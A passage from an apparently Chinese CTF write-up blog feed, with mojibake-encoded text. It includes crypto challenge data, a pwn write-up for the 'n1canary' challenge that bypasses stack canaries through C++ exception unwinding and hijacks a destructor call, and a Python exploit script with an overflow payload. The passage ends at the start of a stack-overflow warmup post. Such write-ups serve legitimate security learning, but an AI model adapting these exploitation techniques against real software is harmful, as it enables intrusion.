class="number">4197805</span>, <span class="number">4197808</span>, <span class="number">4197804</span>, <span class="number">4197802</span>, <span class="number">4197805</span>, <span class="number">4197810</span>, <span class="number">4197810</span>, <span class="number">4197807</span>, <span class="number">4197808</span>, <span class="number">4197807</span>, <span class="number">4197806</span>, <span class="number">4197796</span>, <span class="number">4197806</span>, <span class="number">4197804</span>, <span class="number">4197811</span>, <span class="number">4197807</span>, <span class="number">4197804</span>, <span class="number">4197809</span>, <span class="number">4197807</span>, <span class="number">4197802</span>, <span class="number">4197806</span>, <span class="number">4197809</span>, <span class="number">4197813</span>, <span class="number">4197806</span>, <span class="number">4197807</span>, <span class="number">4197811</span>, <span class="number">4197802</span>, <span class="number">4197812</span>, <span class="number">4197807</span>, <span class="number">4197808</span>, <span class="number">4197809</span>, <span class="number">4197810</span>, <span class="number">4197811</span>, <span class="number">4197804</span>, <span class="number">4197802</span>, <span class="number">4197809</span>, <span class="number">4197808</span>, <span class="number">4197818</span>, <span class="number">4197812</span>, <span class="number">4197810</span>, <span class="number">4197811</span>, <span class="number">4197816</span>, <span class="number">4197805</span>, <span class="number">4197805</span>, <span class="number">4197813</span>, <span class="number">4197815</span>, <span class="number">4197809</span>, <span class="number">4197810</span>, <span class="number">4197818</span>, <span class="number">4197810</span>, <span class="number">4197809</span>, <span class="number">4197815</span>, <span class="number">4197812</span>, <span class="number">4197811</span>, <span class="number">4197810</span>, <span class="number">4197817</span>, <span class="number">4197813</span>, <span class="number">4197817</span>, <span class="number">4197813</span>, <span class="number">4197809</span>, <span class="number">4197814</span>, <span class="number">4197809</span>, <span class="number">4197813</span>, <span class="number">4197812</span>, <span class="number">4197811</span>, <span class="number">4197813</span>, <span class="number">4197811</span>, <span class="number">4197815</span>, <span class="number">4197815</span>, <span class="number">4197816</span>, <span class="number">4197811</span>, <span class="number">4197813</span>, <span class="number">4197813</span>, <span class="number">4197818</span>, <span class="number">4197813</span>, <span class="number">4197815</span>, <span class="number">4197814</span>, <span class="number">4197812</span>, <span class="number">4197811</span>, <span class="number">4197814</span>, <span class="number">4197816</span>, <span class="number">4197817</span>, <span class="number">4197820</span>, <span class="number">4197817</span>, <span class="number">2</span>, <span class="number">4197815</span>, <span class="number">4197817</span>, <span class="number">4197814</span>, <span class="number">1</span>, <span class="number">4197813</span>, <span class="number">4197818</span>, <span class="number">4197820</span>, <span class="number">5</span>, <span class="number">4197817</span>, <span class="number">4197814</span>, <span class="number">4197820</span>, <span class="number">4197817</span>, <span class="number">4197816</span>, <span class="number">4197818</span>, <span class="number">3</span>, <span class="number">4197818</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4197820</span>, <span class="number">4197820</span>, <span class="number">3</span>, <span class="number">4197819</span>, <span class="number">4197819</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4197819</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">23</span>], [<span class="number">4197805</span>, <span class="number">4197801</span>, <span class="number">4197798</span>, <span class="number">4197802</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197805</span>, <span class="number">4197798</span>, <span class="number">4197805</span>, <span class="number">4197806</span>, <span class="number">4197805</span>, <span class="number">4197804</span>, <span class="number">4197810</span>, <span class="number">4197802</span>, <span class="number">4197802</span>, <span class="number">4197803</span>, <span class="number">4197811</span>, <span class="number">4197805</span>, <span class="number">4197802</span>, <span class="number">4197804</span>, <span class="number">4197804</span>, <span class="number">4197800</span>, <span class="number">4197803</span>, <span class="number">4197799</span>, <span class="number">4197801</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197802</span>, <span class="number">4197801</span>, <span class="number">4197807</span>, <span class="number">4197801</span>, <span class="number">4197809</span>, <span class="number">4197807</span>, <span class="number">4197808</span>, <span class="number">4197808</span>, <span class="number">4197809</span>, <span class="number">4197805</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197811</span>, <span class="number">4197803</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197804</span>, <span class="number">4197811</span>, <span class="number">4197808</span>, <span class="number">4197810</span>, <span class="number">4197813</span>, <span class="number">4197812</span>, <span class="number">4197805</span>, <span class="number">4197802</span>, <span class="number">4197809</span>, <span class="number">4197811</span>, <span class="number">4197813</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197811</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197803</span>, <span class="number">4197811</span>, <span class="number">4197814</span>, <span class="number">4197806</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197812</span>, <span class="number">4197811</span>, <span class="number">4197810</span>, <span class="number">4197816</span>, <span class="number">4197808</span>, <span class="number">4197811</span>, <span class="number">4197810</span>, <span class="number">4197813</span>, <span class="number">4197810</span>, <span class="number">4197815</span>, <span class="number">4197809</span>, <span class="number">4197804</span>, <span class="number">4197811</span>, <span class="number">4197811</span>, <span class="number">4197812</span>, <span class="number">4197816</span>, <span class="number">4197810</span>, <span class="number">4197814</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197813</span>, <span class="number">4197809</span>, <span class="number">4197812</span>, <span class="number">4197811</span>, <span class="number">4197812</span>, <span class="number">4197816</span>, <span class="number">4197817</span>, <span class="number">4197812</span>, <span class="number">4197815</span>, <span class="number">4197812</span>, <span class="number">4197817</span>, <span class="number">4197816</span>, <span class="number">4197816</span>, <span class="number">2</span>, <span class="number">4197818</span>, <span class="number">4197815</span>, <span class="number">4197817</span>, <span class="number">4197819</span>, <span class="number">4197819</span>, <span class="number">4197810</span>, <span class="number">4197814</span>, <span class="number">4197818</span>, <span class="number">4197817</span>, <span class="number">4197819</span>, <span class="number">4197819</span>, <span class="number">4197816</span>, <span class="number">4197815</span>, <span class="number">4197818</span>, <span class="number">4197817</span>, <span class="number">4197817</span>, <span class="number">4197819</span>, <span class="number">4197815</span>, <span class="number">4197814</span>, <span class="number">4197819</span>, <span class="number">1</span>, <span class="number">4197817</span>, <span class="number">4197815</span>, <span class="number">0</span>, <span class="number">4197819</span>, <span class="number">4197817</span>, <span class="number">4197820</span>, <span class="number">4197815</span>, <span class="number">4197816</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4197818</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4197817</span>, <span class="number">4197819</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4197820</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4197820</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">15</span>], [<span class="number">4197799</span>, <span class="number">4197792</span>, <span class="number">4197790</span>, <span class="number">4197798</span>, <span class="number">4197797</span>, <span class="number">4197801</span>, <span class="number">4197794</span>, <span class="number">4197796</span>, <span class="number">4197803</span>, <span class="number">4197801</span>, <span class="number">4197796</span>, <span class="number">4197795</span>, <span class="number">4197803</span>, <span class="number">4197795</span>, <span class="number">4197800</span>, <span class="number">4197793</span>, <span class="number">4197799</span>, <span class="number">4197799</span>, <span class="number">4197798</span>, <span class="number">4197793</span>, <span class="number">4197795</span>, <span class="number">4197796</span>, <span class="number">4197799</span>, <span class="number">4197804</span>, <span class="number">4197804</span>, <span class="number">4197797</span>, <span class="number">4197804</span>, <span class="number">4197794</span>, <span class="number">4197796</span>, <span class="number">4197798</span>, <span class="number">4197802</span>, <span class="number">4197798</span>, <span class="number">4197794</span>, <span class="number">4197799</span>, <span class="number">4197795</span>, <span class="number">4197803</span>, <span class="number">4197798</span>, <span class="number">4197802</span>, <span class="number">4197800</span>, <span class="number">4197804</span>, <span class="number">4197805</span>, <span class="number">4197798</span>, <span class="number">4197801</span>, <span class="number">4197804</span>, <span class="number">4197801</span>, <span class="number">4197805</span>, <span class="number">4197804</span>, <span class="number">4197799</span>, <span class="number">4197802</span>, <span class="number">4197799</span>, <span class="number">4197810</span>, <span class="number">4197804</span>, <span class="number">4197801</span>, <span class="number">4197807</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197803</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197809</span>, <span class="number">4197803</span>, <span class="number">4197807</span>, <span class="number">4197804</span>, <span class="number">4197807</span>, <span class="number">4197803</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197806</span>, <span class="number">4197815</span>, <span class="number">4197807</span>, <span class="number">4197816</span>, <span class="number">4197807</span>, <span class="number">4197813</span>, <span class="number">4197805</span>, <span class="number">4197801</span>, <span class="number">4197805</span>, <span class="number">4197806</span>, <span class="number">4197814</span>, <span class="number">4197810</span>, <span class="number">4197807</span>, <span class="number">4197811</span>, <span class="number">4197811</span>, <span class="number">4197809</span>, <span class="number">4197810</span>, <span class="number">4197809</span>, <span class="number">4197813</span>, <span class="number">4197810</span>, <span class="number">4197810</span>, <span class="number">4197815</span>, <span class="number">4197812</span>, <span class="number">4197808</span>, <span class="number">4197804</span>, <span class="number">4197808</span>, <span class="number">4197804</span>, <span class="number">4197811</span>, <span class="number">4197813</span>, <span class="number">4197815</span>, <span class="number">4197808</span>, <span class="number">4197808</span>, <span class="number">4197815</span>, <span class="number">4197815</span>, <span class="number">4197814</span>, <span class="number">4197819</span>, <span class="number">4197812</span>, <span class="number">4197816</span>, <span class="number">4197818</span>, <span class="number">4197815</span>, <span class="number">4197816</span>, <span class="number">4197817</span>, <span class="number">4197809</span>, <span class="number">4197811</span>, <span class="number">4197806</span>, <span class="number">4197817</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4197810</span>, <span class="number">4197816</span>, <span class="number">4197812</span>, <span class="number">4197819</span>, <span class="number">4197817</span>, <span class="number">4197811</span>, <span class="number">4197819</span>, <span class="number">4197815</span>, <span class="number">4197818</span>, <span class="number">4197814</span>, <span class="number">4</span>, <span class="number">4197816</span>, <span class="number">4197818</span>, <span class="number">4197818</span>, <span class="number">2</span>, <span class="number">4197820</span>, <span class="number">2</span>, <span class="number">4197816</span>, <span class="number">4197820</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4197816</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">22</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">26</span>]]</span><br><span class="line"></span><br><span class="line">ct = a7076cebf86512a42b5258d5b197b2065123618122662c2c1533f698da00f21b4c0dbe5afd4cfd093339521ff61f7c4e</span><br></pre></td></tr></table></figure>

<p>åˆ†æç¨‹åºï¼Œå¯ä»¥å‘ç°åœ¨4A&#x3D;Açš„æ¡ä»¶ä¸‹ï¼Œyvæ˜¯ç”±15ä¸ªç›¸åŒçš„yeç”Ÿæˆçš„ã€‚</p>
<p>æºç¨‹åºä¸ºï¼š</p>
<p>te&#x3D;Av*sv</p>
<p>we&#x3D;Av*yv</p>
<p>zv&#x3D;ce*sv+yv</p>
<p>æ³¨æ„åˆ°yv&#x3D;[ye]*15</p>
<p>æ‰€ä»¥we&#x3D;sum(Av)*ye</p>
<p>æ‰€ä»¥yeå¯è§£ï¼Œyvå¯è§£ï¼Œsv&#x3D;(zv-yv)&#x2F;ce</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401310950653.png"></p>
<h3 id="ç­¾åˆ°-x2F-é—®å·"><a href="#ç­¾åˆ°-x2F-é—®å·" class="headerlink" title="ç­¾åˆ°&#x2F;é—®å·"></a>ç­¾åˆ°&#x2F;é—®å·</h3><p>åœ¨å¯¹åº”ä½ç½®è·å–å³å¯ï¼ˆï¼‰</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="n1canary"><a href="#n1canary" class="headerlink" title="n1canary"></a>n1canary</h3><p>ç¡¬å¹²åå°æ—¶çš„é¢˜ç›®ï¼Œæœ€åä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œæœ‰ç‚¹å°ä¸ç”˜â€¦.ï¼ˆè¿˜æ˜¯å¯¹æ¼æ´ä¸æ˜¯å¾ˆæ•æ„Ÿï¼Œå¯¹C++ pwnçš„é¢˜å‹ä¹Ÿæ¥è§¦çš„å¤ªå°‘äº†ï¼‰</p>
<p>å†™ä¸€ä¸‹æ€è·¯å†ç¨‹å§ï¼š</p>
<ol>
<li>ä¸€å¼€å§‹æŠŠæ³¨æ„åŠ›æ”¾åœ¨äº†canaryçš„æ³„éœ²å’Œç»•è¿‡ä¸Šï¼ŒæåŠå¤©å‘ç°åˆæ˜¯éšæœºåˆæ˜¯åŠ å¯†æ ¹æœ¬ç»•ä¸è¿‡ï¼Œåªæœ‰ä¸€æ¬¡å¯èƒ½çš„è¾“å‡ºæ ¹æœ¬æ³„éœ²ä¸äº†ä¸€ç‚¹</li>
<li>ä¹‹åç ”ç©¶äº†ä¸‹C++å¼‚å¸¸æ•è·åŸºå€ï¼Œå¯ä»¥ç›´æ¥ä¸åˆ¤æ–­canaryï¼Œå›é€€æ‰§è¡Œï¼Œä½†æ˜¯å‡ºé¢˜äººåœ¨æ•è·ä¹‹ååŠ äº†ä¸ªexitï¼ˆè£‚å¼€ï¼‰ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</li>
<li>å†ä¹‹åæƒ³é€šè¿‡Unwind_RaiseExceptionå”¯ä¸€çš„leave_retå®Œæˆæ ˆè¿ç§»ç„¶åå‘ç°è¾“å…¥ç‚¹åœ¨gadgetçš„ä¸‹æ–¹ï¼ˆdoubleè£‚å¼€ï¼‰</li>
</ol>
<p>èµ›åå¤ç°äº†ä¸€ä¸‹ï¼Œè°ƒè¯•çš„è¿‡ç¨‹ï¼ˆä¸‹äº†å…­ä¸ªæ–­ç‚¹ï¼‰å’Œé™æ€åˆ†æåŸºæœ¬ä¸Šæ²¡æœ‰é—®é¢˜ï¼Œæ€è·¯åœ¨æŸäº›æ–¹é¢è¿˜æ˜¯å¯¹çš„ï¼ˆé€šè¿‡C++æ•è·å¼‚å¸¸ç»•è¿‡ä¸¤ä¸ªcanaryï¼Œåœ¨bssæ®µä¸Šå¸ƒç½®backdoorï¼‰ã€‚é—®é¢˜å‡ºåœ¨æ²¡æœ‰æ³¨æ„ææ„å‡½æ•°<code>_QWORD *__fastcall std::unique_ptr&lt;BOFApp&gt;::~unique_ptr(__int64 a1)</code> å†…éƒ¨ä¸€ä¸ªå‡½æ•°<code>std::default_delete&lt;BOFApp&gt;::operator()(deleter, *v2)</code>æœ‰ä¸€ä¸ªå¯¹å¯„å­˜å™¨å‚¨å­˜çš„åœ°å€ç»è¿‡ä¸¤æ¬¡è§£å¼•ç”¨çš„è°ƒç”¨ï¼š</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004254.png" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå°†raxçš„å€¼ä½œä¸ºåœ°å€è§£æå¹¶å°†raxçš„å€¼æŒ‡å‘çš„ç©ºé—´çš„æ•°æ®å‚¨å­˜åˆ°rdxï¼Œç»™rdxåŠ ä¸Š8ååˆå°†rdxæŒ‡å‘çš„å†…å­˜å‚¨å­˜çš„æ•°æ®ä¼ ç»™rdxï¼Œæœ€åæ‰§è¡ŒrdxæŒ‡å‘çš„å†…å®¹</p>
<blockquote>
<p><em>äºæ˜¯ï¼Œè‡ªç„¶äº§ç”Ÿäº†è¿™æ ·çš„æƒ³æ³•ï¼šè¦æ˜¯èƒ½å¤Ÿæ§åˆ¶raxçš„å€¼ï¼Œä¸å°±å¯ä»¥æ‰§è¡Œä»»æ„åœ°å€æŒ‡å‘çš„å†…å®¹äº†å—</em></p>
</blockquote>
<p>åŒæ ·ï¼Œå¯ä»¥æ‰§è¡Œæˆ‘ä»¬ç¨‹åºç»™å‡ºçš„åé—¨å‡½æ•°</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004549.png" alt="img"></p>
<p>è°ƒè¯•å¯ä»¥å‘ç°ï¼Œscanfæœ‰æº¢å‡ºï¼ŒåŒæ—¶æ ˆä¸Šè¯»å…¥ç‚¹ç¦»ä¸Šè¿°raxåœ°å€ç›¸å·®0x70</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004311.png" alt="img"></p>
<p>æº¢å‡ºå‰</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004183.png" alt="img"></p>
<p>æº¢å‡ºå</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004019.png" alt="img"></p>
<p>è¿™æ ·åœ¨æ•è·å¼‚å¸¸åï¼Œç»§ç»­æ‰§è¡Œææ„å‡½æ•°å°±å¯ä»¥å¯¹raxè§£æä¸€æ¬¡åå¾—åˆ°user_canaryçš„åœ°å€0x4f4aa0ï¼Œæ¥ä¸‹æ¥è¿˜è¦ç»§ç»­å¯¹0x4f4aa0ä¸Šå‚¨å­˜çš„æ•°æ®è¿›è¡Œä¸€æ¬¡è§£æå¹¶è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€æ¬¡è¾“å…¥åœ¨user_canaryå†™å…¥backdooråœ°å€ï¼Œæ¥æ„é€ rop</p>
<blockquote>
<p><em>è‡³æ­¤ï¼Œæ€è·¯å°±æ˜äº†äº†ï¼Œåˆ†ä¸ºä¸¤æ­¥ï¼š1ã€ç¬¬ä¸€æ¬¡è¾“å…¥å†™å…¥backdooråœ°å€æ„é€ <strong>rop</strong>ï¼Œ2ã€ç¬¬äºŒæ¬¡è¾“å…¥æº¢å‡ºè¦†ç›–raxä¸ºuser_canaryåœ°å€</em></p>
</blockquote>
<p>æ³¨æ„å‡ ä¸ªå‘ï¼š</p>
<ol>
<li>æµ‹è¯•çš„æ—¶å€™è¾“å…¥çš„æ•°æ®ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶ä¼šå¡åœ¨uw_frame_state_forå‡½æ•°æ ¹æœ¬æ²¡æ³•æ‰§è¡Œåˆ°ææ„å‡½æ•°ï¼Œåˆ†æä¸äº†ä¸€ç‚¹</li>
<li>æ³¨æ„slè¿˜æ˜¯sdï¼Œå•ä¸ªè‡ªå·±è§£çš„å½±å“åœ¨è¿™é¢˜æ¯”è¾ƒå¤§ï¼ˆscanfåœ¨\nå¤„æˆªæ–­ï¼‰</li>
<li>ç¬¬äºŒæ­¥æº¢å‡ºçš„æ—¶å€™è®°å¾—ä¸è¦æ”¹å˜åœ°å€0x403407ï¼Œä¸ç„¶ä¹Ÿä¼šå¡ä½ï¼ˆå’Œ1ç±»ä¼¼ï¼‰</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">contextset()</span><br><span class="line">proc(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&#x27;b *0x0000000000403547\n b *0x0000000000403633\n b *0x00000000004037D5\nb *0x0000000000403245\nb *0x000000000040343C\nb *0x42099a\nb *0x040354C\nb *0x00000000004038E6\nb *0x403407\n b *0x41fe58&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(&#x27;b cxa_begin_catch&#x27;)</span></span><br><span class="line">system = <span class="number">0x000000000040338B</span></span><br><span class="line">canary = <span class="number">0x4f4aa0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = (p64(canary)+p64(system)).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#40</span></span><br><span class="line">sda(<span class="string">b&#x27;\n&#x27;</span>,pay)</span><br><span class="line">pr(pay)</span><br><span class="line"><span class="comment">#sla(b&#x27;pwn :)&#x27;,p64(0x4f4aa0))#</span></span><br><span class="line"><span class="comment">#sla(b&#x27;pwn :)&#x27;,b&#x27;a&#x27;*0x60)#</span></span><br><span class="line">sla(<span class="string">b&#x27;pwn :)&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x403407</span>)+p64(canary))</span><br><span class="line"><span class="comment">#pr(rc())</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ï¼šè¿˜æ˜¯å¾—gdbå’ŒIDAç»“åˆè€…çœ‹å•Šï¼Œç¼ºå°‘ä»»ä½•ä¸€ä¸ªéƒ½ä¸è¡Œï¼›C++ææ„å‡½æ•°å¾ˆå®¹æ˜“å‡ºç°æ¼æ´Â·</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T3</title>
    <url>/posts/bd3fdc75/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
<p>2023-01-06WP<br>BUUCTF pwnç¬¬ä¸‰é¢˜<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œä¸ä¸Šé¢˜ç±»ä¼¼</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼ˆçœ‹å¤§ä½¬åšå®¢é‡Œè¯´æŒ‰ç»éªŒè¿™ç§æƒ…å†µä¸€èˆ¬å°±æ˜¯æ ˆæº¢å‡ºäº†ï¼‰<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
